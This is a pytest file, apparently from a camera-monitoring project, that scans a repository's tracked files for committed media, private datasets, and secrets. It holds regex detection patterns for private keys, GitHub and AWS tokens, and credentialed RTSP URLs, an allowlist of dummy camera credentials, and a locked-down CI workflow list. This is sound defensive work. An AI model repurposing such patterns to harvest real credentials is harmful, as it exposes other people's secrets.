from __future__ import annotations

import copy
import csv
import functools
import json
import os
import re
import subprocess
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]

_PROHIBITED_SUFFIXES = {
    ".7z",
    ".arrow",
    ".avi",
    ".bmp",
    ".ckpt",
    ".csv",
    ".db",
    ".feather",
    ".dcm",
    ".dicom",
    ".gif",
    ".flac",
    ".gz",
    ".h5",
    ".jpeg",
    ".jpg",
    ".jsonl",
    ".ico",
    ".m4a",
    ".mkv",
    ".mov",
    ".mp3",
    ".mp4",
    ".ndjson",
    ".lz4",
    ".onnx",
    ".engine",
    ".parquet",
    ".pdf",
    ".png",
    ".pte",
    ".pt",
    ".pth",
    ".rar",
    ".sqlite",
    ".safetensors",
    ".tar",
    ".wasm",
    ".tflite",
    ".tif",
    ".tiff",
    ".tsv",
    ".wav",
    ".webm",
    ".webp",
    ".zip",
}
_PROHIBITED_PATH_PARTS = {
    "annotations",
    "checkpoints",
    "data",
    "dataset",
    "datasets",
    "eval",
    "evaluation",
    "exports",
    "labels",
    "linkage",
    "models",
    "weights",
}
_MEDIA_OR_ARCHIVE_MAGIC = (
    b"\x00\x00\x01\x00",
    b"\x00asm",
    b"\x04\x22\x4d\x18",
    b"!<arch>\n",
    b"%PDF",
    b"SQLite format 3\x00",
    b"fLaC",
    b"\x1aE\xdf\xa3",
    b"\x1f\x8b",
    b"\x28\xb5\x2f\xfd",
    b"\x7fELF",
    b"\xfd7zXZ\x00",
    b"7z\xbc\xaf\x27\x1c",
    b"BM",
    b"BZh",
    b"GIF8",
    b"ID3",
    b"II*\x00",
    b"MM\x00*",
    b"OggS",
    b"PK\x03\x04",
    b"Rar!\x1a\x07",
    b"\x89PNG\r\n\x1a\n",
    b"\xff\xd8\xff",
    b"version https://git-lfs.github.com/spec/v1",
)
_SYNTHETIC_RTSP_FIXTURES = {
    # 엣지 브링업 스킬의 두 URL 은 값이 아니라 변수 보간이다. 자격증명이 문자열
    # 안에 들어 있는 게 아니라 실행 시점에 환경변수에서 온다. 허용 목록이 정확한
    # 문자열로 매칭되니, 누군가 나중에 여기에 실제 비밀번호를 박아 넣으면 문자열이
    # 달라져 가드가 그대로 잡는다 — 예외가 파일 전체로 번지지 않는다.
    Path(".claude/skills/edge-bringup/references/worker-roster.md"): {
        "rtsp://{CAM_USER}:{CAM_PASSWORD}@{camera_ip}:554/trackID=2",
        # <사용자>/<비밀번호>/<카메라 IP> 도 값이 아니라 사람이 채워 넣을 자리
        # 표시자다. 호스트 자리표시자에 공백이 있어(`<카메라 IP>`) 정규식이
        # 호스트를 `<카메라` 에서 끊어 매칭한다.
        "rtsp://<사용자>:<비밀번호>@<카메라",
    },
    Path(".claude/skills/edge-bringup/scripts/rtsp_sweep.sh"): {
        "rtsp://${CAM_USER}:${CAM_PASSWORD}@${ip}:554/${TRACK}",
    },
    Path("tests/test_alert_amplification_harness.py"): {
        # 스캐너가 자격증명 포함 RTSP URL 을 거부하는지 증명하는 입력값이다.
        # 실제 카메라가 아니라 거부되어야 하는 형태를 보여주는 합성 리터럴.
        "rtsp://user:pass@camera/live",
    },
    # 이슈 #325: ffmpeg stderr 진단을 로그로 올릴 때 자격증명이 절대 렌더링되지
    # 않는지 증명하는 합성 입력이다. 실제 카메라가 아니라, 마스킹되어야 하는
    # 형태 그 자체가 테스트 대상이다.
    Path("tests/test_worker_nvdec_process.py"): {
        "rtsp://admin:secret@camera/token=abc",
    },
    Path("tests/test_worker_decode_supervision.py"): {
        "rtsp://admin:secret@camera/token=abc",
    },
    Path("front/src/features/camera-management/CameraManagementPage.test.tsx"): {
        "rtsp://user:***@redacted-camera/live",
    },
    Path("front/src/features/cameras/AddCameraModal.test.tsx"): {
        "rtsp://operator:***@192.0.2.10:8554/live",
        "rtsp://operator:secret@192.0.2.10:8554/trackID=1?profile=main",
        "rtsp" "://operator:camera-password@camera.local:554/"
        "trackID=1?profile=main&opaque-secret-token&another%2Dsecret"
        "#token=fragment-secret",
        "rtsp" "://operator:camera-password@[invalid-host:554/"
        "trackID=1?profile=main&token=query-secret&token=second-secret",
        "rtsp://***@[invalid-host:554/"
        "trackID=1?profile=***&token=***&token=***",
        "rtsp://operator:secret@192.0.2.10:8554/Streaming/Channels/101?subtype=0",
    },
    Path("front/src/features/cameras/cameraRegistrationForm.test.ts"): {
        "rtsp://operator:secret@192.0.2.10:8554/Streaming/Channels/101?subtype=0",
        "rtsp://operator%20name:p%40ss%2Fword@camera.local:554/trackID=1",
    },
    Path("front/src/features/cameras/CameraCard.test.tsx"): {
        "rtsp://user:****@camera.local/stream",
    },
    # 세 IDIS 서브스트림 안내 테스트의 fixture. 192.0.2.10 은 실제 카메라가
    # 아니라 문서용 TEST-NET-1 주소(RFC 5737)이고 admin:pw 는 고정 더미
    # 자격증명이다.
    Path("front/src/features/settings/CameraEditModal.test.tsx"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
    },
    Path("front/src/features/settings/CameraRegisterModal.test.tsx"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
        "rtsp://admin:pw@192.0.2.10:554/trackID=2",
    },
    Path("front/src/features/settings/rtspSubstreamGuidance.test.ts"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
        "rtsp://admin:pw@192.0.2.10:554/TrackId=1",
        "rtsp://admin:pw@192.0.2.10:554/stream",
        "rtsp://admin:pw@192.0.2.10:554/trackID=2",
        "rtsp://admin:pw@192.0.2.10:554/trackID=3",
    },
    Path("front/src/shared/api/normalizers.test.ts"): {
        "rtsp://operator:hunter2@camera.internal.example:554/stream",
    },
    Path("tests/test_api_camera_registry.py"): {
        "rtsp://user:secret@camera.local:8554/live",
        "rtsp://***:***@redacted-camera:8554/live",
        "rtsp://user:secret@local/stream",
        "rtsp://***:***@redacted-camera/stream",
        "rtsp://admin:admin@cam.local/stream",
        "rtsp://admin:newpass@cam.local/stream",
    },
    Path("tests/test_camera_api.py"): {
        # camera.example 는 문서용(RFC 2606) 예약 도메인이고 operator:private 는
        # 고정 더미 자격증명이다 -- 실제 카메라나 비밀이 아니다. 이 테스트는 이
        # 자격증명이 토폴로지 응답에서 절대 새지 않음을 증명한다.
        "rtsp://operator:private@camera.example/live",
    },
    Path("tests/test_camera_roster_sync.py"): {
        "rtsp://user:password@camera/private",
    },
    Path("tests/test_camera_topology_store.py"): {
        "rtsp://operator:private@10.0.0.9/live",
    },
    Path("tests/test_sources_rtsp.py"): {
        "rtsp://user:password@camera.local/live",
        "rtsp://user:secret@camera.local/live?token=abc",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://user:password@host/stream",
        "rtsp://***:***@host/stream",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc#fragment-secret",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc",
        "rtsp://***:***@host/stream"
        "?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
    },
    Path("tests/test_catalog_verify.py"): {
        "rtsp://operator:fixture-password@192.0.2.10/s",
        "rtsp://operator:fixture-password@192.0.2.11/s",
    },
    Path("tests/test_clips_catalog.py"): {
        "rtsp://operator:fixture-password@example.test/live",
    },
    Path("tests/test_worker_config_lifecycle.py"): {
        "rtsp://user:camera-pass@camera/live",
        "rtsp://user:leaked-camera-password@camera/live",
    },
    Path("tests/test_worker_config_local_overrides.py"): {
        "rtsp://user:camera-pass@camera/live",
    },
    Path("tests/test_worker_ingest_lifecycle.py"): {
        "rtsp://operator:s3cr3t@example.test/live?token=plain",
    },
    Path("tests/test_worker_ingest_rtsp.py"): {
        "rtsp://user:secret@camera.local/live?token=abc",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc#fragment-secret",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc",
        "rtsp://***:***@host/stream"
        "?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
    },
    Path("tests/test_analysis_timeline.py"): {
        # URL 모양이라는 이유만으로 컴포넌트 식별자에서 거부됨을 증명하는 픽스처.
        # user:secret 는 고정 더미이고 자격증명 자체는 검증 대상이 아니다.
        "rtsp://user:secret@camera/model",
    },
    Path("tests/test_edge_topology_contract.py"): {
        # bed-exit e2e 스크립트가 BED_EXIT_RTSP_URL 을 dry-run 출력에서
        # `rtsp://<redacted>` 로 마스킹함을 증명한다. camera-1.local 은
        # 예약 .local 이고 camera-user:camera-secret 는 고정 더미다.
        "rtsp://camera-user:camera-secret@camera-1.local/trackID=2",
    },
    Path("tests/test_rtsp_url_policy.py"): {
        # camera.example/cam.example 는 문서용(RFC 2606) 예약 도메인이고
        # user:pass 는 고정 더미 자격증명이다. 이 테스트들은 userinfo 가 핀 고정
        # 과정에서 보존되고 정책이 URL 을 올바르게 허용/거부함을 증명한다.
        "rtsp://user:pass@camera.example:8554/path?subtype=0",
        "rtsp://user:pass@cam.example:8554/live?x=1",
        # cam.example 이 8.8.8.8 로 핀 고정된 뒤의 pinned_url -- userinfo 보존 확인.
        "rtsp://user:pass@8.8.8.8:8554/live?x=1",
    },
    Path("tests/test_runtime_manifest.py"): {
        # camera.local 은 예약 .local 이고 admin:secret 는 고정 더미다. 이
        # 테스트는 자격증명 URL 이 매니페스트 직렬화에 절대 포함되지 않음을 증명한다.
        "rtsp://admin:secret@camera.local/live",
    },
    Path("tests/test_worker_mjpeg_server.py"): {
        # 8.8.8.8 은 admission DNS 핀 고정이 성공하도록 쓰는 공개 IP 이고
        # user:secret 는 고정 더미다. 이 테스트들은 probe URL/자격증명이 응답에
        # 절대 새지 않음을 증명한다.
        "rtsp://user:secret@8.8.8.8/trackID=2",
    },
    Path("tests/test_decode_seam_nvdec_subprocess.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_worker_nvdec_adapter.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
    },
    Path("tests/test_worker_nvdec_probe.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_worker_vaapi_adapter.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
    },
    Path("tests/test_worker_vaapi_probe.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_public_repository_privacy.py"): {
        "rtsps" "://operator:not-a-fixture@camera.example/stream",
        "rtsps" "://operator:secret@camera.example/stream",
    },
}
_TEXT_PATTERNS = {
    "private-key": re.compile(
        r"-----BEGIN (?:EC |OPENSSH |PGP |RSA )?PRIVATE KEY-----"
    ),
    "credentialed-rtsp": re.compile(
        r"rtsps?://(?P<username>[^/\s:@]+):(?P<password>[^@\s/]+)"
        r"@(?P<host>[^/\s\"']+)(?:/[^\s\"']*)?",
        re.IGNORECASE,
    ),
    "rtsp-query-secret": re.compile(
        r"rtsps?://[^\s\"']*[?&](?:token|secret|password|username)="
        r"[^&#\s\"']+",
        re.IGNORECASE,
    ),
    "github-token": re.compile(
        r"(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})"
    ),
    "aws-access-key": re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}"),
    "encoded-media-data-uri": re.compile(
        r"data:[^;,\r\n]{1,128};base64,",
        re.IGNORECASE,
    ),
    "hex-encoded-media-signature": re.compile(
        r"(?:8950" r"4e470d0a1a0a|2550" r"4446|ffd8" r"ff|504b" r"0304)",
        re.IGNORECASE,
    ),
}


def _validate_index_mode(mode: bytes, path: bytes) -> None:
    if mode not in {b"100644", b"100755"}:
        raise AssertionError(
            f"non-regular index entry: {path.decode(errors='replace')} ({mode.decode()})"
        )


@functools.cache
def _index_blobs() -> tuple[tuple[Path, bytes], ...]:
    result = subprocess.run(
        ["git", "ls-files", "--stage", "-z"],
        cwd=ROOT,
        check=True,
        capture_output=True,
    )
    blobs: list[tuple[Path, bytes]] = []
    for record in result.stdout.split(b"\0"):
        if not record:
            continue
        metadata, raw_path = record.split(b"\t", 1)
        mode, oid, stage = metadata.split()
        if stage != b"0":
            raise AssertionError(f"unmerged index entry: {raw_path.decode(errors='replace')}")
        _validate_index_mode(mode, raw_path)
        blob = subprocess.run(
            ["git", "cat-file", "blob", oid.decode("ascii")],
            cwd=ROOT,
            check=True,
            capture_output=True,
        ).stdout
        blobs.append((Path(raw_path.decode("utf-8")), blob))
    return tuple(blobs)


def _looks_like_media_or_archive(blob: bytes) -> bool:
    if blob.startswith(_MEDIA_OR_ARCHIVE_MAGIC):
        return True
    if len(blob) >= 12 and blob[4:8] == b"ftyp":
        return True
    if len(blob) >= 12 and blob[8:12] in {b"AVI ", b"WAVE", b"WEBP"}:
        return True
    if len(blob) >= 132 and blob[128:132] == b"DICM":
        return True
    return len(blob) >= 262 and blob[257:262] == b"ustar"


def _collect_mapping_keys(value: object) -> set[str]:
    keys: set[str] = set()
    if isinstance(value, dict):
        for key, child in value.items():
            keys.add(str(key).strip().lower())
            keys.update(_collect_mapping_keys(child))
    elif isinstance(value, list):
        for child in value:
            keys.update(_collect_mapping_keys(child))
    return keys


def _structured_document_keys(text: str) -> set[str]:
    significant_lines = [
        line.strip()
        for line in text.splitlines()
        if line.strip()
        and not line.lstrip().startswith("#")
        and line.strip() != "---"
        and not line.strip().startswith("%YAML")
    ]
    if not significant_lines:
        return set()
    first = significant_lines[0]
    structured_header = re.compile(
        r"""^["']?[A-Za-z_][A-Za-z0-9_]*["']?\s*:"""
    )
    collection_start = first.startswith(("{", "[", "-"))
    if first.startswith(("{", "[")):
        try:
            return _collect_mapping_keys(json.loads(text))
        except json.JSONDecodeError:
            pass
    if not collection_start and not structured_header.match(first):
        return set()
    try:
        return _collect_mapping_keys(yaml.load(text, Loader=yaml.BaseLoader))
    except yaml.YAMLError:
        return set()


def _looks_like_sensitive_dataset(blob: bytes) -> bool:
    try:
        text = blob.decode("utf-8-sig")
    except UnicodeDecodeError:
        return False
    first_line = next((line for line in text.splitlines() if line.strip()), "")
    if not first_line:
        return False

    identity_fields = {"camera_id", "facility_id", "resident_id", "subject_id"}
    evidence_fields = {"annotation", "fall", "file_path", "frame_path", "label"}

    structured_fields = _structured_document_keys(text)
    if len(structured_fields & identity_fields) >= 2:
        return True
    if structured_fields & identity_fields and structured_fields & evidence_fields:
        return True

    for delimiter in (",", ";", "\t"):
        fields = {
            field.strip().lower()
            for field in next(csv.reader([first_line], delimiter=delimiter))
        }
        if len(fields & identity_fields) >= 2:
            return True
        if fields & identity_fields and fields & evidence_fields:
            return True
    return False


def _is_explicit_synthetic_rtsp(relative: Path, match: re.Match[str]) -> bool:
    value = match.group(0)
    if value in _SYNTHETIC_RTSP_FIXTURES.get(relative, set()):
        return True
    policy_path = Path("tests/test_public_repository_privacy.py")
    return relative == policy_path and any(
        value in fixtures for fixtures in _SYNTHETIC_RTSP_FIXTURES.values()
    )


def _has_url_safe_or_wrapped_base64(text: str) -> bool:
    contiguous = r"(?<![A-Za-z0-9+/_-])[A-Za-z0-9+/_-]{512,}"
    if re.search(contiguous, text):
        return True

    for block in re.split(r"\n[ \t]*\n", text):
        payload_lines = [
            re.sub(r"^\s*(?:#|//)\s?", "", line)
            for line in block.splitlines()
        ]
        candidate = re.sub(r"\s+", "", "".join(payload_lines))
        if len(candidate.rstrip("=")) >= 512 and re.fullmatch(
            r"[A-Za-z0-9+/_-]+={0,2}", candidate
        ):
            return True
    return False


def _text_violation_labels(relative: Path, text: str) -> set[str]:
    violations: set[str] = set()
    for label, pattern in _TEXT_PATTERNS.items():
        scan_text = text
        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
            scan_text = re.sub(r"""(["'])\s*(?:\+\s*)?["']""", "", text)
        matches = list(pattern.finditer(scan_text))
        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
            matches = [
                match
                for match in matches
                if not _is_explicit_synthetic_rtsp(relative, match)
            ]
        if matches:
            violations.add(label)
    if _has_url_safe_or_wrapped_base64(text):
        violations.add("url-safe-or-wrapped-base64")
    return violations


def _contains_forbidden_control_bytes(blob: bytes) -> bool:
    return any(byte < 9 or 13 < byte < 32 for byte in blob)


PUBLIC_SAFE_STRUCTURED_FIXTURES = frozenset(
    {
        Path("worker/ml-worker.example.yaml"),
        Path("models/pose/metadata.yaml"),
    }
)


PUBLIC_SAFE_CONTRACT_FIXTURES = frozenset(
    {
        # edge-provisioning-v1's request/response contract fixtures. This
        # JSON document trips the identity+evidence-field heuristic below
        # (it has both "camera_id" and "label" keys, coincidentally --
        # topology-snapshot request bodies use both) even though it is a
        # synthetic API-contract corpus, not recorded footage metadata. The
        # file's own metadata.redaction field is checked below so a future
        # edit that starts embedding real values changes that string and the
        # guard catches it again -- the exemption doesn't silently widen.
        Path("contracts/edge-provisioning-v1/contract-fixtures.json"),
    }
)
_CONTRACT_FIXTURE_REDACTION_NOTICE = "Synthetic identifiers and redacted one-time values only"


def _is_public_safe_contract_fixture(relative: Path, blob: bytes) -> bool:
    if relative not in PUBLIC_SAFE_CONTRACT_FIXTURES:
        return False
    try:
        document = json.loads(blob.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return False
    if not isinstance(document, dict):
        return False
    metadata = document.get("metadata")
    if not isinstance(metadata, dict):
        return False
    return metadata.get("redaction") == _CONTRACT_FIXTURE_REDACTION_NOTICE


def _is_public_safe_structured_fixture(relative: Path, blob: bytes) -> bool:
    if relative not in PUBLIC_SAFE_STRUCTURED_FIXTURES:
        return False
    document = yaml.load(blob, Loader=yaml.BaseLoader)
    if not isinstance(document, dict):
        return False
    identity_keys = {"camera_id", "facility_id", "resident_id", "subject_id"}
    outside_cameras = {
        key: value for key, value in document.items() if key != "cameras"
    }
    if _collect_mapping_keys(outside_cameras) & identity_keys:
        return False
    cameras = document.get("cameras")
    if not isinstance(cameras, list) or not cameras:
        return False
    allowed_camera_keys = {
        "camera_id",
        "facility_id",
        "resident_id",
        "rtsp_url",
        "heartbeat_interval_sec",
        "frame_stride",
        "label",
    }
    for camera in cameras:
        if not isinstance(camera, dict) or set(camera) != allowed_camera_keys:
            return False
        if not re.fullmatch(r"camera-\d+", str(camera.get("camera_id", ""))):
            return False
        if not re.fullmatch(r"facility-\d+", str(camera.get("facility_id", ""))):
            return False
        if not re.fullmatch(r"resident-\d+", str(camera.get("resident_id", ""))):
            return False
        rtsp_url = str(camera.get("rtsp_url", ""))
        if not re.fullmatch(r"rtsp://camera-\d+\.local/trackID=\d+", rtsp_url):
            return False
        if not re.fullmatch(r"Room \d+", str(camera.get("label", ""))):
            return False
    return True


def _is_prohibited_path(relative: Path) -> bool:
    # Exact-path exemption only -- explicitly named-safe fixtures (see
    # PUBLIC_SAFE_STRUCTURED_FIXTURES's docstring above) bypass the path-part
    # guardrail below without weakening it for anything else under a
    # prohibited directory like `models/`.
    if relative in PUBLIC_SAFE_STRUCTURED_FIXTURES:
        return False
    lowered_parts = {part.lower() for part in relative.parts}
    lowered_suffixes = {suffix.lower() for suffix in relative.suffixes}
    return bool(
        lowered_parts & _PROHIBITED_PATH_PARTS
        or lowered_suffixes & _PROHIBITED_SUFFIXES
    )


def test_tracked_tree_contains_no_data_or_private_binary_assets() -> None:
    violations: list[str] = []
    for relative, blob in _index_blobs():
        if _is_prohibited_path(relative):
            violations.append(str(relative))
            continue
        is_private_structured_data = (
            _looks_like_sensitive_dataset(blob)
            and not _is_public_safe_structured_fixture(relative, blob)
            and not _is_public_safe_contract_fixture(relative, blob)
        )
        if _contains_forbidden_control_bytes(blob):
            violations.append(f"{relative}:control-bytes")
            continue
        if _looks_like_media_or_archive(blob) or is_private_structured_data:
            violations.append(str(relative))
            continue
        try:
            blob.decode("utf-8")
        except UnicodeDecodeError:
            violations.append(f"{relative}:unknown-binary")

    assert violations == []


def test_tracked_text_contains_no_embedded_secret_or_media_payload() -> None:
    violations: list[str] = []

    for relative, blob in _index_blobs():
        try:
            text = blob.decode("utf-8")
        except UnicodeDecodeError:
            continue
        violations.extend(
            f"{relative}:{label}"
            for label in sorted(_text_violation_labels(relative, text))
        )

    assert violations == []


@pytest.mark.parametrize(
    ("text", "expected_label"),
    [
        ("A" * 512, "url-safe-or-wrapped-base64"),
        ("data" + ":image/png;base64," + "A" * 64, "encoded-media-data-uri"),
        ("_" * 512, "url-safe-or-wrapped-base64"),
        ("\n".join(["A" * 64] * 8), "url-safe-or-wrapped-base64"),
        (
            "data" + ":application/pdf;base64," + "A" * 64,
            "encoded-media-data-uri",
        ),
        (" ".join(["A" * 16] * 32), "url-safe-or-wrapped-base64"),
        (
            "\n".join(["A" * 64, "# split"] * 8),
            "url-safe-or-wrapped-base64",
        ),
        (
            "\n".join(["# " + "A" * 64] * 8),
            "url-safe-or-wrapped-base64",
        ),
        ("8950" "4e470d0a1a0a" + "00" * 32, "hex-encoded-media-signature"),
        (
            "rtsps" "://operator:not-a-fixture@camera.example/stream",
            "credentialed-rtsp",
        ),
    ],
)
def test_text_scanner_rejects_encoded_payloads(
    text: str, expected_label: str
) -> None:
    labels = _text_violation_labels(Path("synthetic-input.txt"), text)
    assert expected_label in labels


def test_text_scanner_allows_short_encoded_looking_text() -> None:
    assert _text_violation_labels(Path("synthetic-input.txt"), "A" * 63) == set()


@pytest.mark.parametrize(
    "path",
    [
        Path("Data/export.txt"),
        Path("models/weights.txt"),
        Path("public/disguised.CSV.txt"),
        Path("public/clip.MP4.backup"),
    ],
)
def test_path_policy_rejects_case_and_double_extension_evasions(path: Path) -> None:
    assert _is_prohibited_path(path)


@pytest.mark.parametrize(
    "blob",
    [
        "facility_id,resident_id\nfacility,resident".encode("utf-16le"),
        "facility_id,resident_id\nfacility,resident".encode("utf-16be"),
        ("rtsps" "://operator:secret@camera.example/stream").encode("utf-32le"),
        b"safe-prefix\x00hidden",
    ],
)
def test_control_byte_gate_rejects_alternate_encodings(blob: bytes) -> None:
    assert _contains_forbidden_control_bytes(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"\x89PNG\r\n\x1a\npayload",
        b"PK\x03\x04archive",
        b"facility_id,resident_id,label\nfacility,resident,fall",
        b"camera_id\tframe_path\tannotation\ncamera\tframe.jpg\tfall",
    ],
)
def test_content_classifier_rejects_disguised_private_assets(blob: bytes) -> None:
    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)

@pytest.mark.parametrize(
    "blob",
    [
        b"BZh91AY&SY",
        b"\xfd7zXZ\x00payload",
        b"\x28\xb5\x2f\xfdpayload",
        b"\x1aE\xdf\xa3payload",
        b"ID3payload",
        b"%PDF-1.7",
        b"SQLite format 3\x00payload",
        b"fLaCpayload",
        b"\x00asmpayload",
        b"\x04\x22\x4d\x18payload",
        b"\x00\x00\x01\x00payload",
        b"!<arch>\npayload",
        b"\x00" * 128 + b"DICMpayload",
        b"facility_id,resident_id\nfacility,resident",
        b'{"facility_id":"facility","subject_id":"subject"}',
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:0000000000000000000000000000000000000000000000000000000000000000\n"
        b"size 1024\n",
        b"facility_id: facility\nresident_id: resident\n",
        b'{\n  "records": [\n'
        b'    {"facility_id": "facility", "resident_id": "resident"}\n'
        b"  ]\n}\n",
        b"# synthetic adversarial document\n---\nrecords:\n"
        b"  - facility_id: facility\n"
        b"    resident_id: resident\n",
        b"- facility_id: facility\n  resident_id: resident\n",
        b"{facility_id: facility, resident_id: resident}\n",
        b'\xef\xbb\xbf"facility_id","frame_path","annotation"\n'
        b'"facility","frame.jpg","fall"',
    ],
)
def test_classifier_rejects_additional_disguised_private_assets(blob: bytes) -> None:
    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"def camera_id() -> str:\n    return 'camera-a'\n",
        b"public equations and source schemas remain allowed\n",
    ],
)
def test_classifier_allows_public_safe_source_text(blob: bytes) -> None:
    assert not _looks_like_media_or_archive(blob)
    assert not _looks_like_sensitive_dataset(blob)


def test_public_worker_example_allowlist_is_closed_world() -> None:
    relative = Path("worker/ml-worker.example.yaml")
    blob = next(blob for path, blob in _index_blobs() if path == relative)
    assert _is_public_safe_structured_fixture(relative, blob)

    camera_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
    camera_mutation["cameras"][0]["subject_id"] = "subject"
    assert not _is_public_safe_structured_fixture(
        relative, yaml.safe_dump(camera_mutation).encode()
    )

    nested_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
    nested_mutation["private_records"] = [
        {"facility_id": "facility", "resident_id": "resident"}
    ]
    assert not _is_public_safe_structured_fixture(
        relative, yaml.safe_dump(nested_mutation).encode()
    )


def test_ignore_policy_has_no_data_exception() -> None:
    ignore_blob = next(
        blob for relative, blob in _index_blobs() if relative == Path(".gitignore")
    )
    lines = ignore_blob.decode("utf-8").splitlines()
    assert "data/" in lines
    assert not any(line.startswith("!data/") for line in lines)


def _workflow(name: str) -> dict[str, object]:
    path = ROOT / ".github" / "workflows" / name
    for relative, blob in _index_blobs():
        if relative == path.relative_to(ROOT):
            loaded = yaml.load(blob, Loader=yaml.BaseLoader)
            assert isinstance(loaded, dict)
            return loaded
    raise AssertionError(f"workflow is not tracked: {name}")


# ci.yml is an UNTRUSTED workflow: `pull_request` makes it execute fork-authored
# code on a runner that also holds a checkout of this repository. The
# closed-world allowlist below is the control that keeps that safe. Every job,
# every ordered step, and every action pin is matched exactly, so a step added
# to public CI has to be *declared* here rather than inferred, and the mutation
# tests underneath prove the allowlist still bites.
#
# The job graph grew from one serial `test` job to `secrets` / `lint` / `test`
# (a 4-way shard matrix) / `ci-ok`, and `push` is now restricted to `main` so a
# PR no longer runs this workflow twice on the identical commit. Splitting the
# work does not relax the contract -- each job carries its own exact step
# allowlist, and `ci-ok` is the single job branch protection points at.
#
# Two obvious speedups stay deliberately OFF, and this is the file that keeps
# them off: `actions/cache` is forbidden outright and setup-uv keeps
# `enable-cache: false`.
#
# The reason recorded in aa5e2c0 -- that a poisoned fork-PR cache entry would be
# restored by a later trusted run on `main` -- is WRONG, and correcting it does
# not change the policy. GitHub's cache documentation says the opposite in so
# many words: "When a cache is created by a workflow run triggered on a pull
# request, the cache is created for the merge ref (refs/pull/.../merge).
# Because of this, the cache will have a limited scope and can only be restored
# by re-runs of the pull request. It cannot be restored by the base branch or
# other pull requests targeting that base branch." GitHub's own low-trust cache
# hardening -- which does make `pull_request_target`, `issue_comment` and
# `workflow_run` read-only against the default branch's cache scope -- then
# states plainly: "The `pull_request` event is not affected."
# (https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching)
# The poisoning direction the old comment described does not exist.
#
# The honest reasons the ban stays:
#   * It buys a PR no wall clock. `ci-ok` is not this repository's critical
#     path -- the required `Build edge ML images + boot smoke` check is -- so
#     even a perfect uv cache saves 0s of PR wall clock.
#   * There is nothing to save anyway: on a runner `uv sync` is ~21s and the
#     model fetch is ~900KB / ~1s.
#   * Cache capacity is already the binding constraint. The repository's Actions
#     cache is past its 10 GB limit (10.7 GiB measured), almost all of it
#     BuildKit blobs for the DeepStream layers, and entries are being evicted
#     mid-run. A uv cache would evict image layers whose rebuild costs minutes
#     to save seconds.
#   * And a closed-world allowlist is cheaper to keep closed than to reason
#     about per entry.
_ACTION_PIN = re.compile(r"^[^@]+@[0-9a-f]{40}$")

_CHECKOUT_STEP = {
    "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
    "with": {"persist-credentials": "false"},
}

_SETUP_UV_STEP = {
    "uses": "astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
    "with": {"enable-cache": "false", "version": "0.11.27"},
}

# gitleaks needs only the checked-out tree and docker -- no uv, no apt, no
# models -- so it is its own job and starts reporting in seconds.
_SECRETS_STEPS = [
    _CHECKOUT_STEP,
    {
        "name": "Scan tracked tree for secrets",
        "run": (
            'docker run --rm -v "$GITHUB_WORKSPACE:/repo:ro" '
            "zricethezav/gitleaks@sha256:"
            "691af3c7c5a48b16f187ce3446d5f194838f91238f27270ed36eef6359a574d9 "
            "detect --source=/repo --no-git --redact --exit-code=1"
        ),
    },
]

# Static checks. This job deliberately carries NO apt step and NO model fetch:
# ruff, import-linter, verify_scope_fidelity.py and `docker compose config` read
# the repo tree and nothing else, so the ~28s ffmpeg/fonts install and the model
# download buy it nothing. Scope fidelity runs a tracked in-repo Python script
# over this same checkout: it greps for env-provisioned facility identity and
# camera roster residue, fetches nothing, reads no secret, starts no container,
# and re-checks out no other repository. The compose step only renders config
# from the tracked, placeholder-only .env.edge.prod.example (never the
# gitignored real .env.edge.prod), pulls no images and starts no containers.
_LINT_STEPS = [
    _CHECKOUT_STEP,
    _SETUP_UV_STEP,
    {"run": "uv sync --frozen --group lint"},
    {"run": "uv run --group lint ruff check ."},
    {"run": "uv run --group lint lint-imports"},
    {
        "name": (
            "Scope fidelity "
            "(no env-provisioned identity or camera roster)"
        ),
        "run": (
            "uv run python scripts/verify_scope_fidelity.py --fixture\n"
            "uv run python scripts/verify_scope_fidelity.py --repo\n"
        ),
    },
    {
        "name": "Edge env example renders (GPU + CPU-only overlay)",
        "run": (
            "docker compose --env-file .env.edge.prod.example \\\n"
            "  -f compose.edge.yaml -f compose.edge.cpu.yaml config -q\n"
        ),
    },
]

# The shard's file discovery, byte for byte. Kept as its own constant because
# `test_shard_partition_is_an_exact_cover_of_the_suite` re-derives the very same
# partition in Python and asserts it covers the tracked suite exactly: the
